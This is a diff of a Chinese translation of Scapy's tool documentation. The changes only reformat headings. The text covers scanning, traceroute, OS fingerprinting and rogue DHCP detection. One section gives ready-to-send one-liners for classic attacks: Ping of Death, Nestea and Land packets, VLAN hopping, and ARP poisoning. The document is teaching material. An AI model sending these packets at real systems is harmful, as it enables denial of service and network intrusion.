 如果其他的都失败了，还可以使用UDP Ping，它可以让存活主机产生ICMP Port unreachable错误。你可以挑选任何极有可能关闭的端口，就像端口0：
+
 ```python
 >>> ans,unans=sr( IP(dst="192.168.*.1-10")/UDP(dport=0) )
 ```
+
 同样的，使用以下命令收集结果：
+
 ```python
 >>> ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )
 ```
 
-## Classical attacks
+#### 8、Classical attacks
 
 畸形数据包：
+
 ```python
 >>> send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())
 ```
+
 死亡之ping (Muuahahah)：
+
 ```python
 >>> send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) )
 ```
+
 Nestea attack:
+
 ```python
 >>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
 >>> send(IP(dst=target, id=42, frag=48)/("X"*116))
 >>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
 ```
+
 Land攻击（专为微软视窗）：
+
 ```python
 >>> send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
 ```
 
-## ARP cache poisoning
+#### 9、ARP cache poisoning
 
 这种攻击可以通过VLAN跳跃攻击投毒ARP缓存，使得其他客户端无法加入真正的网关地址。
 
@@ -1085,7 +1203,7 @@ Land攻击（专为微软视窗）：
       inter=RandNum(10,40), loop=1 )
 ```
 
-## TCP Port Scanning
+#### 10、TCP Port Scanning
 
 发送一个TCP SYN到每一个端口上。等待一个SYN-ACK或者是RST或者是一个ICMP错误：
 
@@ -1093,12 +1211,14 @@ Land攻击（专为微软视窗）：
 >>> res,unans = sr( IP(dst="target")
                 /TCP(flags="S", dport=(1,1024)) )
 ```
+
 将开放的端口结果可视化：
+
 ```python
 >>> res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
 ```
 
-## IKE Scanning
+#### 11、IKE Scanning
 
 我们试图通过发送`ISAKMP Security Association proposals`来确定VPN集中器，并接收应答：
 
@@ -1108,19 +1228,23 @@ Land攻击（专为微软视窗）：
                 /ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal())
               )
 ```
+
 可视化结果列表：
+
 ```python
 >>> res.nsummary(prn=lambda (s,r): r.src, lfilter=lambda (s,r): r.haslayer(ISAKMP) )
 ```
 
-## Advanced traceroute
+#### 12、Advanced traceroute
 
-### TCP SYN traceroute
+##### TCP SYN traceroute
 
 ```python
 >>> ans,unans=sr(IP(dst="4.2.2.1",ttl=(1,10))/TCP(dport=53,flags="S"))
 ```
+
 结果会是：
+
 ```python
 >>> ans.summary( lambda(s,r) : r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
 192.168.1.1     time-exceeded
@@ -1132,20 +1256,24 @@ Land攻击（专为微软视窗）：
 4.2.2.1         SA
 ```
 
-### UDP traceroute
+##### UDP traceroute
 
 相比较TCP来说， traceroute一个UDP应用程序是不可靠的，因为ta没有握手的过程。我们需要给一个应用性的有效载荷（DNS，ISAKMP，NTP等）来得到一个应答：
+
 ```python
 >>> res,unans = sr(IP(dst="target", ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname="test.com"))
 ```
+
 我们可以想象得到一个路由器列表的结果：
+
 ```python
 >>> res.make_table(lambda (s,r): (s.dst, s.ttl, r.src))
 ```
 
-### DNS traceroute
+##### DNS traceroute
 
 我们可以在`traceroute()`函数中设置`l4`参数为一个完整的数据包，来实现DNS traceroute：
+
 ```python
 >>> ans,unans=traceroute("4.2.2.1",l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="thesprawl.org")))
 Begin emission:
@@ -1163,16 +1291,18 @@ Received 75 packets, got 28 answers, remaining 2 packets
 ... 
 ```
 
-## Etherleaking
+#### 13、Etherleaking
+
 ```python
 >>> sr1(IP(dst="172.16.1.232")/ICMP())
 <IP src=172.16.1.232 proto=1 [...] |<ICMP code=0 type=0 [...]|
 <Padding load=’0O\x02\x01\x00\x04\x06public\xa2B\x02\x02\x1e’ |>>>
 ```
 
-## ICMP leaking
+#### 14、ICMP leaking
 
 这是一个Linux2.0的一个bug：
+
 ```python
 >>> sr1(IP(dst="172.16.1.1", options="\x02")/ICMP())
 <IP src=172.16.1.1 [...] |<ICMP code=0 type=12 [...] |
@@ -1181,20 +1311,24 @@ Received 75 packets, got 28 answers, remaining 2 packets
 <Padding load=’\x00[...]\x00\x1d.\x00V\x1f\xaf\xd9\xd4;\xca’ |>>>>>
 ```
 
-## VLAN hopping
+#### 15、VLAN hopping
 
 在非常特殊的情况下，使用double 802.1q封装，可以将一个数据包跳到另一个VLAN中：
+
 ```python
 >>> sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())
 ```
 
-## Wireless sniffing
+#### 16、Wireless sniffing
 
 以下的命令将会像大多数的无线嗅探器那样显示信息：
+
 ```python
 >>> sniff(iface="ath0",prn=lambda x:x.sprintf("{Dot11Beacon:%Dot11.addr3%\t%Dot11Beacon.info%\t%PrismHeader.channel%\tDot11Beacon.cap%}"))
 ```
+
 以上命令会产生类似如下的输出：
+
 ```python
 00:00:00:01:02:03 netgear      6L   ESS+privacy+PBCC
 11:22:33:44:55:66 wireless_100 6L   short-slot+ESS+privacy
@@ -1202,9 +1336,9 @@ Received 75 packets, got 28 answers, remaining 2 packets
 12:34:56:78:90:12 NETGEAR      6L   short-slot+ESS+privacy+short-preamble
 ```
 
-# 0x04 Recipes
+### 0x04 Recipes
 
-## Simplistic ARP Monitor
+#### 1、Simplistic ARP Monitor
 
 以下的程序使用了`sniff()`函数的回调功能（prn参数）。将store参数设置为0，就可以使`sniff()`函数不存储任何数据（否则会存储），所以就可以一直嗅探下去。filter参数则用于在高负荷的情况下有更好的性能：filter会在内核中应用，而且Scapy就只能嗅探到ARP流量。
 
@@ -1219,15 +1353,16 @@ def arp_monitor_callback(pkt):
 sniff(prn=arp_monitor_callback, filter="arp", store=0)
 ```
 
-## Identifying rogue DHCP servers on your LAN
+#### 2、Identifying rogue DHCP servers on your LAN
 
-### Problem
+##### Problem
 
 你怀疑有人已经在你的LAN中安装了额外的未经授权的DHCP服务器-无论是故意的还是有意的。因此你想要检查是否有任何活动的DHCP服务器，并确定他们的IP和MAC地址。
 
-### Solution
+##### Solution
 
 使用Scapy发送一个DHCP发现请求，并分析应答：
+
 ```python
 >>> conf.checkIPaddr = False
 >>> fam,hw = get_if_raw_hwaddr(conf.iface)
@@ -1238,31 +1373,33 @@ Finished to send 1 packets.
 .*...*..
 Received 8 packets, got 2 answers, remaining 0 packets
 ```
+
 在这种情况下，我们得到了两个应答，所以测试网络上有两个活动的DHCP服务器：
+
 ```python
 >>> ans.summarize()
 Ether / IP / UDP 0.0.0.0:bootpc > 255.255.255.255:bootps / BOOTP / DHCP ==> Ether / IP / UDP 192.168.1.1:bootps > 255.255.255.255:bootpc / BOOTP / DHCP
 Ether / IP / UDP 0.0.0.0:bootpc > 255.255.255.255:bootps / BOOTP / DHCP ==> Ether / IP / UDP 192.168.1.11:bootps > 255.255.255.255:bootpc / BOOTP / DHCP
-}}}
+} } }
 We are only interested in the MAC and IP addresses of the replies:
-{{{
+{ { {
 >>> for p in ans: print p[1][Ether].src, p[1][IP].src
 ...
 00:de:ad:be:ef:00 192.168.1.1
 00:11:11:22:22:33 192.168.1.11
 ```
 
-## Discussion
+#### 3、Discussion
 
 我们设置`multi=True`来确保Scapy在接收到第一个响应之后可以等待更多的应答数据包。这也就是我们为什么不用更方便的`dhcp_request()`函数，而是手动地构造DCHP数据包的原因：`dhcp_request()`使用`srp1()`来发送和接收数据包，这样在接收到一个应答数据包之后就会立即返回。
 
 此外，Scapy通常确保应答来源于之前发送请求的目的地址。但是我们的DHCP数据包被发送到IP广播地址（255.255.255.255），任何应答数据包都将回复DCHP服务器的IP地址作为其源IP地址（e.g. 192.168.1.1）。由于这些IP地址不匹配，我们必须在发送请求前使用`conf.checkIPaddr = False`来禁用Scapy的check。
 
-### See also
+##### See also
 
 [http://en.wikipedia.org/wiki/Rogue_DHCP](http://en.wikipedia.org/wiki/Rogue_DHCP)
 
-## Firewalking
+#### 4、Firewalking
 
 TTL减一操作过滤后，只有没被过滤的数据包会产生一个ICMP TTL超时
 
@@ -1272,40 +1409,44 @@ TTL减一操作过滤后，只有没被过滤的数据包会产生一个ICMP TTL
         if r.haslayer(ICMP) and r.payload.type == 11:
             print s.dport
 ```
+
 在对多网卡的防火墙查找子网时，只有它自己的网卡IP可以达到这个TTL：
+
 ```python
 >>> ans, unans = sr(IP(dst="172.16.5/24", ttl=15)/TCP())
 >>> for i in unans: print i.dst
 ```
 
-## TCP Timestamp Filtering
+#### 5、TCP Timestamp Filtering
 
-### Problem
+##### Problem
 
 在比较流行的端口扫描器中，一种常见的情况就是没有设置TCP时间戳选项，而许多防火墙都包含一条规则来丢弃这样的TCP数据包。
 
-### Solution
+##### Solution
 
 为了让Scapy能够到达其他位置，就必须使用其他选项：
+
 ```python
 >>> sr1(IP(dst="72.14.207.99")/TCP(dport=80,flags="S",options=[('Timestamp',(0,0))]))
 ```
 
-## Viewing packets with Wireshark
+#### 6、Viewing packets with Wireshark
 
-### Problem
+##### Problem
 
 你已经使用Scapy收集或者嗅探了一些数据包，因为Wireshark高级的数据包展示功能，你想使用Wireshark查看这些数据包。
 
-### Solution
+##### Solution
 
 正好可以使用`wireshark()`函数：
+
 ```python
 >>> packets = Ether()/IP(dst=Net("google.com/30"))/ICMP()     # first generate some packets
 >>> wireshark(packets)                                        # show them with Wireshark
 ```
 
-### Discussion
+##### Discussion
 
 `wireshark()`函数可以生成一个临时pcap文件，来包含你的数据包，然后会在后台启动Wireshark，使其在启动时读取该文件。
 
@@ -1313,15 +1454,18 @@ TTL减一操作过滤后，只有没被过滤的数据包会产生一个ICMP TTL
 
 你可以通过改变conf.prog.wireshark的配置设置，来告诉Scapy去哪寻找Wireshark可执行文件。
 
-## OS Fingerprinting
+#### 7、OS Fingerprinting
 
-### ISN
+##### ISN
 
 Scapy的可用于分析ISN（初始序列号）递增来发现可能有漏洞的系统。首先我们将在一个循环中发送SYN探头，来收集目标响应：
+
 ```python
 >>> ans,unans=srloop(IP(dst="192.168.1.1")/TCP(dport=80,flags="S"))
 ```
+
 一旦我们得到响应之后，我们可以像这样开始分析收集到的数据：
+
 ```python
 >>> temp = 0
 >>> for s,r in ans:
@@ -1336,17 +1480,22 @@ Scapy的可用于分析ISN（初始序列号）递增来发现可能有漏洞的
 4283643696      +5901310
 ```
 
-### nmap_fp
+##### nmap_fp
 
 在Scapy中支持Nmap指纹识别（是到Nmap v4.20的“第一代”功能）。在Scapy v2中，你首先得加载扩展模块：
+
 ```python
 >>> load_module("nmap")
 ```
+
 如果你已经安装了Nmap，你可以让Scapy使用它的主动操作系统指纹数据库。清确保version 1签名数据库位于指定的路径：
+
 ```python
 >>> conf.nmap_base
 ```
+
 然后你可以使用“namp_fp()`”函数，该函数和Nmap操作系统检测引擎使用同样的探针：
+
 ```python
 >>> nmap_fp("192.168.1.1",oport=443,cport=1)
 Begin emission:
@@ -1358,13 +1507,16 @@ Received 58 packets, got 7 answers, remaining 1 packets
 w/grsecurity.org and HZ=1000 patches', 'Linux 2.4.7 - 2.6.11'])
 ```
 
-### p0f
+##### p0f
 
 如果你已在操作系统中安装了p0f，你可以直接从Scapy中使用它来猜测操作系统名称和版本。（仅在SYN数据库被使用时）。首先要确保p0f数据库存在于指定的路径：
+
 ```python
 >>> conf.p0f_base
 ```
+
 例如，根据一个捕获的数据包猜测操作系统：
+
 ```python
 >>> sniff(prn=prnp0f)
 192.168.1.100:54716 - Linux 2.6 (newer, 1) (up: 24 hrs)
